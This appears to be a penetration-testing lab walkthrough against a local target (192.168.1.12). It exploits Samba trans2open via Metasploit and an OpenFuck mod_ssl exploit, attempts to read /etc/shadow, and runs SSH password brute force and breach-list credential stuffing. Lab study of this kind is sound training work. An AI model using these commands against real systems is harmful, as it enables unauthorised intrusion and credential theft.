## Metasploit

- searchsploit samba 2.2
- 
    
    <img width="938" height="524" alt="image" src="https://github.com/user-attachments/assets/df16d170-26ff-4465-b681-96aca2e38bbd" />

    
- msfconsole
- search trans2open
- 

<img width="901" height="43" alt="image" src="https://github.com/user-attachments/assets/b7be359d-6bcd-49cf-84d2-a671fdeb8ef6" />


- 1st Try to exploit using this payload (Fail)

<img width="514" height="22" alt="image" src="https://github.com/user-attachments/assets/f0d120e7-14e0-4f8f-8c28-743c4c662fc1" />

- 1st Try to exploit Fail Result

<img width="577" height="22" alt="image" src="https://github.com/user-attachments/assets/ca5437f4-ea74-4d7f-870a-e99bd779c20f" />


- 2nd Try to exploit by list out the payloads available (set payload linux/x86/) click x2 TAB on keyboard.
- 

<img width="1025" height="754" alt="image" src="https://github.com/user-attachments/assets/3486ff2d-0f8b-4ed9-a2ad-3f886683702c" />

- 2nd Try to exploit using Non-Staged Payload (Success)

<img width="451" height="23" alt="image" src="https://github.com/user-attachments/assets/6354d217-d7e3-48d3-9e9e-899e975d64d3" />


- 2nd Try to exploit Success Result
- 

<img width="1056" height="373" alt="image" src="https://github.com/user-attachments/assets/06d0f089-cdd7-4232-a926-ec1ee37b35ce" />

## Manual Exploitation

- Using OpenLuck from github
- ./OpenFuck
- 

<img width="524" height="25" alt="image" src="https://github.com/user-attachments/assets/c77988f1-ab11-45de-b0d3-35c01fd3fd34" />


- ./OpenFuck 0x6b 192.168.1.12 -c 40
- 

<img width="513" height="414" alt="image" src="https://github.com/user-attachments/assets/01e1ad7c-a2b8-4138-8862-14c3125b27ef" />


- 

<img width="486" height="74" alt="image" src="https://github.com/user-attachments/assets/77dd7cad-fa91-4e80-afc5-c1d2a340b9f8" />


- cat /etc/shadow: Permission denied

## Brute Force Attack on SSH

- use metasploit - search ssh
- use auxiliary/scanner/ssh/ssh_login
- set username root
- set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
- set rhosts 192.168.1.12
- set threads 10
- set verbose true
- true
- exploit
- 

<img width="544" height="407" alt="image" src="https://github.com/user-attachments/assets/da4fedd6-bab2-4db3-965c-9fb17ccd4b09" />


## Credential Stuffing and Password Spraying

- Use from Tesla Breach Parse List of Usernames and Passwords to include in the Burpsuite (Intruder)
